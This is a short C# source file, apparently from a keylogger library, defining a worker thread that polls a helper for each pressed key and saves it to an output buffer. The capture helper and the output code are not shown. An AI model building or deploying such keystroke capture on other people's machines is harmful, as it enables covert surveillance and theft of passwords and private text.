using KeyLogger.Library.Appenders;
using KeyLogger.Library.Helpers;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace KeyLogger.Library.Worker
{
    public class KeyLoggerWorker
    {
        private const int SLEEP_TIME = 120; //120 miliseconds

        // This method will be called when the thread is started. 
        public void DoWork(object appender)
        {
            while (!_shouldStop)
            {
                char key = KeyBoardHelper.GetKeyPressed();
                ((IOutputAppender)appender).SaveToBuffer(key);
                Thread.Sleep(SLEEP_TIME);
            }
        }

        public void RequestStop()
        {
            _shouldStop = true;
        }

        // Volatile is used as hint to the compiler that this data 
        // member will be accessed by multiple threads. 
        private volatile bool _shouldStop;
    }
}
